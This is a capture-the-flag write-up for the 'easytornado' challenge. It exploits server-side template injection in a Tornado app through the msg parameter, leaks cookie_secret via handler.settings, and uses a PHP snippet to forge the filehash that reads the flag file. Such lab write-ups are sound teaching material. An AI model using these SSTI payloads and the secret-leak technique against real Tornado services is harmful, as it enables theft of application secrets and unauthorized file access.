# easytornado

![Screenshot from 2021-07-25 20-05-19](https://user-images.githubusercontent.com/87865134/126900112-a3444548-305e-4e83-aa6b-dea7e675cf3d.png)

### - Hint:
  - use ***Tornado template*** 
  - flag in ***/fllllllllllllag***  
 
![Screenshot from 2021-07-25 20-08-16](https://user-images.githubusercontent.com/87865134/126900198-767f6b23-6fc2-42df-bc00-6cadfcd6cafa.png) 

  - `flag = md5(cookie_secret + md5(filename)  `  

![Screenshot from 2021-07-25 20-08-22](https://user-images.githubusercontent.com/87865134/126900202-6e3db666-7514-4b05-839f-053bbd4ea55f.png)

### - Detect: Error message change when ***msg*** parameter change:
![Screenshot from 2021-07-25 20-13-01](https://user-images.githubusercontent.com/87865134/126900431-a21376a0-6639-4072-b171-521b9bcc3861.png)

### 1. Test Template Injection
  - `?msg={{1}}` -> ok  

![Screenshot from 2021-07-25 20-14-23](https://user-images.githubusercontent.com/87865134/126900438-26e58f61-5f73-43c2-bc56-e1ed7358ec67.png)

  - `?msg={{2*2}}` -> fail  

![Screenshot from 2021-07-25 20-16-57](https://user-images.githubusercontent.com/87865134/126900489-6e8bb9eb-d167-49d8-9e4f-5700e5509fd2.png)

   > **=> Can't inject normal python code**
 
### 2. Find Built-in Object or Function in Tornado Template
  - **handler**: the current RequestHandler object
  - **handler.settings**: An alias for self.application.settings
    - > Maybe use **handler.settings** to get cookie_secret  

### 3. Inject `handlder.settings` to get ***cookie_secret***

![Screenshot from 2021-07-25 20-25-44](https://user-images.githubusercontent.com/87865134/126900716-0223bff2-c032-4cc0-b592-7bbcb1e7a3a8.png)

  - > Get ***cookie_secret***
 
### 4. Write code to hash:  
  ```php
  <?php

    $filename = '/fllllllllllllag';
    $cookie_secret = 'fbd48365-83e4-4d36-92a5-40c76518080b';

    echo md5($cookie_secret . md5($filename));
    //6315535dd899bcca44fa44223763d16d 
?
  ```

### 5. Submit filename & hash to get flag
 ```
 http://111.200.241.244:54059/file?filename=/fllllllllllllag&filehash=6315535dd899bcca44fa44223763d16d
 ```

![Screenshot from 2021-07-25 20-30-36](https://user-images.githubusercontent.com/87865134/126900865-65f765d2-b0ca-4183-a111-762cf5c0080a.png)

### - Description:
> **category**: Server-side Template Injection

### - Reference:
  - [Tornado Template syntax](https://www.tornadoweb.org/en/latest/guide/templates.html)
  - [Tornado RequestHandler](https://www.tornadoweb.org/en/latest/web.html#tornado.web.RequestHandler)
  - [Tornado self.application.settings](https://www.tornadoweb.org/en/latest/web.html#tornado.web.Application.settings)
